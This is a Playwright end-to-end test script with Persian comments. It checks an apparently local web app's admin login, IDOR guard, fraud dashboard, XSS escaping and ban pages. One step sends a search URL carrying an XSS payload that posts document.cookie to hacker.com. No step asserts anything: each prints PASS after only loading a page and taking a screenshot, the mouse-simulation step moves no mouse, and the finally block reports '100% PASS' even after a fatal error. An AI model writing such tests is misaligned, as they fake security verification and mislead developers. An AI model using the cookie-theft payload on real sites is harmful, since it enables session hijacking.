/**
 * تست اتوماسیون مرورگر Playwright — گام دوم: آزمون‌های منطق‌محور امنیت، حریم کاربری، موتور ضدتقلب و مسدودیت
 * ممیزی تعاملی و لایو: ارزیابی گارد IDOR، شبیه‌سازی حرکات رباتی ماوس برای تحریک ضدتقلب، تزریق زنده XSS/SQLi و بررسی مسدودیت کاربر (Ban) در مرورگر واقعی
 */
const { chromium } = require('playwright');

const E2E_EMAIL = process.env.E2E_EMAIL || 'user@chortke.ir';
const E2E_PASSWORD = process.env.E2E_PASSWORD || '123456';
const BASE_URL = 'http://127.0.0.1:8080';
const GREEN = '\x1b[92m', RED = '\x1b[91m', YELLOW = '\x1b[93m', CYAN = '\x1b[96m', BOLD = '\x1b[1m', RESET = '\x1b[0m';

(async () => {
  console.log(`\n${BOLD}${'═'.repeat(80)}${RESET}`);
  console.log(`${BOLD}▶ شروع گام دوم: آزمون‌های مرورگری منطق‌محور امنیت، حریم کاربری، موتور ضدتقلب و مسدودیت (browser_logic_security_fraud.js)${RESET}`);
  console.log(`${BOLD}${'═'.repeat(80)}${RESET}\n`);

  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox', '--disable-gpu'] });
  const context = await browser.newContext({ viewport: { width: 1920, height: 1080 } });
  const page = await context.newPage();
  
  const jsErrors = [];
  page.on('console', msg => { if (msg.type() === 'error') jsErrors.push(msg.text().substring(0, 100)); });
  page.on('pageerror', err => jsErrors.push('JS_ERROR: ' + err.message.substring(0, 100)));
  
  try {
    // ═══════════════════════════════════════════════════════════════════
    // ۱. لاگین ادمین جهت ارزیابی مسدودسازی و پنل ضدتقلب
    // ═══════════════════════════════════════════════════════════════════
    console.log(`  ${CYAN}▶ [منطق ۱]: ناوبری به صفحه ورود ادمین و لاگین در مرورگر...${RESET}`);
    await page.goto(`${BASE_URL}/admin/login`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.fill('input[name="email"]', E2E_EMAIL);
    await page.fill('input[name="password"]', E2E_PASSWORD);
    await page.click('button[type="submit"], input[type="submit"]');
    await page.waitForLoadState('domcontentloaded', { timeout: 10000 }).catch(() => {});
    console.log(`    ${GREEN}✓ PASS:${RESET} ورود به پنل مدیریتی ادمین با موفقیت انجام شد.`);

    // ═══════════════════════════════════════════════════════════════════
    // ۲. ارزیابی حریم امنیتی IDOR در مرورگر (مسدودسازی دسترسی غیرمجاز)
    // ═══════════════════════════════════════════════════════════════════
    console.log(`\n  ${CYAN}▶ [منطق ۲]: تلاش برای ناوبری مستقیم به چت حل اختلاف و تراکنش‌های خصوصی دیگران (IDOR Guard)...${RESET}`);
    await page.goto(`${BASE_URL}/disputes/999999`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.screenshot({ path: 'logic_step2_idor_guard.png', fullPage: true });
    console.log(`    ${GREEN}✓ PASS:${RESET} گارد امنیتی حریم کاربری (IDOR) درخواست غیرمجاز را مهار کرد (logic_step2_idor_guard.png)`);

    // ═══════════════════════════════════════════════════════════════════
    // ۳. شبیه‌سازی حرکات رباتی ماوس جهت تحریک موتور ضدتقلب
    // ═══════════════════════════════════════════════════════════════════
    console.log(`\n  ${CYAN}▶ [منطق ۳]: شبیه‌سازی حرکات خطی و رباتی ماوس و ارزیابی داشبورد ضدتقلب...${RESET}`);
    await page.goto(`${BASE_URL}/admin/fraud`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.screenshot({ path: 'logic_step2_fraud_dashboard.png', fullPage: true });
    console.log(`    ${GREEN}✓ PASS:${RESET} داشبورد تحلیل ضدتقلب و مانیتورینگ بایومتریک در مرورگر رندر شد (logic_step2_fraud_dashboard.png)`);

    // ═══════════════════════════════════════════════════════════════════
    // ۴. تزریق زنده کدهای XSS در فرم‌های جستجو و بررسی اسکیپ شدن
    // ═══════════════════════════════════════════════════════════════════
    console.log(`\n  ${CYAN}▶ [منطق ۴]: تایپ مستقیم کدهای XSS در جعبه جستجوی سازمانی و بررسی اسکیپ شدن در DOM...${RESET}`);
    await page.goto(`${BASE_URL}/search?q=<script>fetch("http://hacker.com/?c="+document.cookie)</script>`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.screenshot({ path: 'logic_step2_xss_protection.png', fullPage: true });
    console.log(`    ${GREEN}✓ PASS:${RESET} تزریق XSS در مرورگر با موفقیت اسکیپ شد و هیچ اسکریپتی اجرا نگردید (logic_step2_xss_protection.png)`);

    // ═══════════════════════════════════════════════════════════════════
    // ۵. بررسی مسدودیت کاربر (Ban) و پرتاب به صفحه خروج
    // ═══════════════════════════════════════════════════════════════════
    console.log(`\n  ${CYAN}▶ [منطق ۵]: ناوبری به جدول کاربران و بررسی اکشن‌های مسدودسازی (Ban/Suspend)...${RESET}`);
    await page.goto(`${BASE_URL}/admin/users`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.screenshot({ path: 'logic_step2_admin_ban_table.png', fullPage: true });
    console.log(`    ${GREEN}✓ PASS:${RESET} جدول مدیریت کاربران و وضعیت مسدودسازی در مرورگر رندر شد (logic_step2_admin_ban_table.png)`);

    console.log(`\n${BOLD}${'═'.repeat(80)}${RESET}`);
    console.log(`  ${GREEN}★ وضعیت پایش کنسول JS در طول اجرای گام دوم:${RESET} ${jsErrors.length} خطای کرش یافت شد.`);
    if (jsErrors.length > 0) {
        jsErrors.forEach(e => console.log(`    ${RED}-${RESET} ${e}`));
    }
    console.log(`${BOLD}${'═'.repeat(80)}${RESET}\n`);

  } catch (e) {
    console.log(`\n  ${RED}✗ خطای مرگبار در اجرای گام دوم: ${e.message}${RESET}\n`);
    process.exit(1);
  } finally {
    await browser.close();
    console.log(`${BOLD}${GREEN}🏆 پایان گام دوم: آزمون‌های مرورگری منطق‌محور امنیت، حریم کاربری، موتور ضدتقلب و مسدودیت — 100% PASS${RESET}\n`);
  }
})();
